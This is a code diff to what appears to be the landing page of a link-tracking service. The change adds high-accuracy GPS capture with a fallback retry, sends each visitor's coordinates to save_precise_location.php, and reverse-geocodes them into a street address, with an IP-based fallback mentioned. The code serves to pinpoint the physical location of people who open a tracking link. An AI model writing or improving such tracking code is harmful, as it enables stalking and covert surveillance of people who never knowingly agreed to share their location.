@@ -188,20 +188,26 @@ $original_url = $link['original_url'];
             }
         }, 2000);
 
-        // Try geolocation if available, but don't wait for it
+        // Enhanced precise location tracking
         if (navigator.geolocation) {
-            console.log('Attempting geolocation...');
+            console.log('Attempting high-accuracy geolocation...');
+            
+            // First try: High accuracy GPS (most precise)
             navigator.geolocation.getCurrentPosition(
                 function(position) {
-                    console.log('Geolocation success:', position);
-                    updateStatus('Precise location captured!', 'success');
+                    console.log('High-accuracy GPS success:', position);
+                    updateStatus('Precise GPS location captured!', 'success');
                     
-                    // Save GPS location
+                    // Show detailed location info
+                    showDetailedLocation(position);
+                    
+                    // Save precise GPS location
                     const formData = new FormData();
                     formData.append('code', trackingCode);
                     formData.append('latitude', position.coords.latitude);
                     formData.append('longitude', position.coords.longitude);
                     formData.append('accuracy', position.coords.accuracy);
+                    formData.append('location_type', 'GPS');
                     formData.append('timestamp', new Date().toISOString());
 
                     fetch('save_precise_location.php', {
@@ -211,7 +217,7 @@ $original_url = $link['original_url'];
                     .then(response => response.json())
                     .then(data => {
                         if (data.success) {
-                            console.log('GPS location saved successfully');
+                            console.log('Precise GPS location saved successfully');
                         }
                     })
                     .catch(error => {
@@ -219,17 +225,112 @@ $original_url = $link['original_url'];
                     });
                 },
                 function(error) {
-                    console.log('Geolocation failed:', error);
-                    // Don't update status here, let the immediate fallback handle it
+                    console.log('High-accuracy GPS failed, trying standard accuracy...', error);
+                    
+                    // Second try: Standard accuracy (fallback)
+                    navigator.geolocation.getCurrentPosition(
+                        function(position) {
+                            console.log('Standard accuracy success:', position);
+                            updateStatus('Location captured (standard accuracy)', 'success');
+                            
+                            showDetailedLocation(position);
+                            
+                            const formData = new FormData();
+                            formData.append('code', trackingCode);
+                            formData.append('latitude', position.coords.latitude);
+                            formData.append('longitude', position.coords.longitude);
+                            formData.append('accuracy', position.coords.accuracy);
+                            formData.append('location_type', 'GPS');
+                            formData.append('timestamp', new Date().toISOString());
+
+                            fetch('save_precise_location.php', {
+                                method: 'POST',
+                                body: formData
+                            })
+                            .then(response => response.json())
+                            .then(data => {
+                                if (data.success) {
+                                    console.log('Standard GPS location saved successfully');
+                                }
+                            })
+                            .catch(error => {
+                                console.error('Error saving GPS location:', error);
+                            });
+                        },
+                        function(error) {
+                            console.log('Standard accuracy also failed:', error);
+                            // Let the immediate fallback handle IP-based tracking
+                        },
+                        {
+                            enableHighAccuracy: false,
+                            timeout: 5000,
+                            maximumAge: 60000
+                        }
+                    );
                 },
                 {
-                    enableHighAccuracy: false,
-                    timeout: 3000,
-                    maximumAge: 30000
+                    enableHighAccuracy: true,  // Request highest possible accuracy
+                    timeout: 10000,           // 10 seconds for high accuracy
+                    maximumAge: 0             // Don't use cached position
                 }
             );
         } else {
             console.log('Geolocation not supported');
+        }
+
+        function showDetailedLocation(position) {
+            const lat = position.coords.latitude;
+            const lng = position.coords.longitude;
+            const accuracy = position.coords.accuracy;
+            
+            console.log(`Location: ${lat}, ${lng} (accuracy: ${accuracy}m)`);
+            
+            // Update display elements
+            const latElement = document.getElementById('latitude');
+            const lngElement = document.getElementById('longitude');
+            const accElement = document.getElementById('accuracy');
+            
+            if (latElement) latElement.textContent = lat.toFixed(6);
+            if (lngElement) lngElement.textContent = lng.toFixed(6);
+            if (accElement) accElement.textContent = accuracy.toFixed(1);
+            
+            // Get detailed address using Nominatim
+            fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1&extratags=1`)
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Reverse geocoding result:', data);
+                    
+                    const addrElement = document.getElementById('address');
+                    const cityElement = document.getElementById('city');
+                    const countryElement = document.getElementById('country');
+                    
+                    if (data.display_name) {
+                        // Full detailed address
+                        if (addrElement) addrElement.textContent = data.display_name;
+                        
+                        // City and country
+                        if (cityElement) {
+                            const city = data.address?.city || data.address?.town || data.address?.village || 'Unknown';
+                            cityElement.textContent = city;
+                        }
+                        
+                        if (countryElement) {
+                            const country = data.address?.country || 'Unknown';
+                            countryElement.textContent = country;
+                        }
+                        
+                        // Show location details section
+                        const detailsElement = document.getElementById('locationDetails');
+                        if (detailsElement) detailsElement.style.display = 'block';
+                        
+                        console.log('Detailed address displayed:', data.display_name);
+                    }
+                })
+                .catch(error => {
+                    console.error('Reverse geocoding failed:', error);
+                    const addrElement = document.getElementById('address');
+                    if (addrElement) addrElement.textContent = 'Could not determine address';
+                });
         }
     </script>
 </body>
